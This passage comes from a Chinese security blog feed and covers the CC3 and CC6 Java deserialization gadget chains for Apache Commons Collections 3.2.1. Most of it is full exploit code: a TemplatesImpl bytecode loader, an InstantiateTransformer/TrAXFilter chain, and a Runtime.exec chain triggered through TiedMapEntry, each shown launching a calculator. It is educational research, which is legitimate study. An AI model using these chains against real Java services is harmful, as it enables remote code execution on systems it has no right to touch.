class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样顺利弹出计算器</p><h2 id="回归正题-–-CC3-链"><a href="#回归正题-–-CC3-链" class="headerlink" title="回归正题 – CC3 链"></a>回归正题 – CC3 链</h2><h3 id="CC3-链分析"><a href="#CC3-链分析" class="headerlink" title="CC3 链分析"></a>CC3 链分析</h3><p>因为只需要调用 <code>TemplatesImpl</code> 类的 <code>newTransformer()</code> 方法，便可以进行命令执行，所以我们去到 <code>newTransformer()</code> 方法下，查找用法</p><p><img src="/img/CC3/c11.png"></p><ul><li>这里主要是找到了四个，我们一个个讲解一下为什么是 <code>TrAXFilter</code> 而不是其他的。</li></ul><p>Process 这个在 main 里面，是作为一般对象用的，所以不用它。</p><p>第二个 <code>getOutProperties</code>，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。</p><p>TransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参(Runtime.exec)，我们需要去找构造函数。而它的构造函数难传参。</p><p>最后，<code>TrAXFilter</code>，它也是不能序列化的，但是看到他的构造函数</p><p><img src="/img/CC3/c12.png"></p><p>执行构造函数，便可调用newTransformer方法</p><p>CC3 这里的作者没有调用 <code>InvokerTransformer</code>，而是调用了一个新的类 <code>InstantiateTransformer</code>。</p><ul><li><code>InstantiateTransformer</code> 这个类是用来初始化 <code>Transformer</code> 的，我们去找 <code>InstantiateTransformer</code> 类下的 <code>transform</code> 方法。</li></ul><h3 id="编写EXP-1"><a href="#编写EXP-1" class="headerlink" title="编写EXP"></a>编写EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-comment">// TemplatesImpl 的 EXP 编写</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        instantiateTransformer.transform(TrAXFilter.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写到这里是可以直接弹出计算器的</p><p>与CC1链子结合，利用Transformer和ChainedTransformer传入TrAXFilter.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// TemplatesImpl 的 EXP 编写</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//与CC1前半部分链子结合一下</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-comment">// 实例化 AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-comment">//新建动态代理</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// 新建AnnotationInvocationHandler实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, mapProxy);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利弹出计算器</p><p><img src="/img/CC3/C14.png"></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CC3链与前面链子不同之处主要在于命令执行利用的类不同</p><p>CC3主要利用了define方法从外部加载class文件执行恶意代码，Invokertransform类被放入黑名单后，可以利用CC3链</p><p>与CC1链子结合</p><p><img src="/img/CC3/CC3.png"></p><p>CC3链与前几条链子不同之处</p><p><img src="/img/CC3/CC3.png"></p><p>是这部分代替了Invokertransform类的命令执行</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-CC6链</title>
    <link href="/2025/09/05/Java%E5%AE%89%E5%85%A8-CC6%E9%93%BE/"/>
    <url>/2025/09/05/Java%E5%AE%89%E5%85%A8-CC6%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-CC6链"><a href="#Java安全-CC6链" class="headerlink" title="Java安全-CC6链"></a>Java安全-CC6链</h1><p> CC6 链可以不受 jdk 版本制约，适用范围非常广，可以说是最好用的链</p><p>CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>Jdk 8u65</li><li>Comoons-Collections 3.2.1</li></ul><h2 id="CC6-链分析"><a href="#CC6-链分析" class="headerlink" title="CC6 链分析"></a>CC6 链分析</h2><h3 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h3><ul><li>因为前半段链子，<code>LazyMap</code> 类到 <code>InvokerTransformer</code> 类是一样的，我们直接到 <code>LazyMap</code> 下。</li></ul><p>我们还是找其他调用 <code>get()</code> 方法的地方</p><p>这里我们找到了<code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法</p><p><img src="/img/CC6/c01.png"></p><p>新建一个TiedMapEntry的实例并调用getValue方法，前面链子的内容是与CC1相同的，无需改动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//危险参数构造</span><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//生成LazyMap实例</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//新建TiedMapEntry实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-number">1</span>);<br>        tiedMapEntry.getValue();<br>    &#125;<br>&#125;    <br></code></pre></td></tr></table></figure><p>到这里是可以正常弹出计算器的</p><p>继续跟进，可以找到同一个类中hashcode方法调用了getValue方法</p><p><img src="/img/CC6/c02.png"></p><h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><p>这里是可以参考URLDNS这条链的</p><p>回顾URLDNS的利用链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Gadget Chain:<br>HashMap.readObject()<br>HashMap.put()<br>HashMap.<span class="hljs-built_in">hash</span>()<br>URL.hashCode()<br></code></pre></td></tr></table></figure><p>其实HashMap入口类这里是可以通用的</p><p>在 Java 反序列化当中，找到 <code>hashCode()</code> 之后的链子用的基本都是这一条。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">xxx.readObject()<br>HashMap.put() --自动调用--&gt;   HashMap.hash()<br>后续利用链.hashCode()<br></code></pre></td></tr></table></figure><p>编写EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//危险参数构造</span><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, 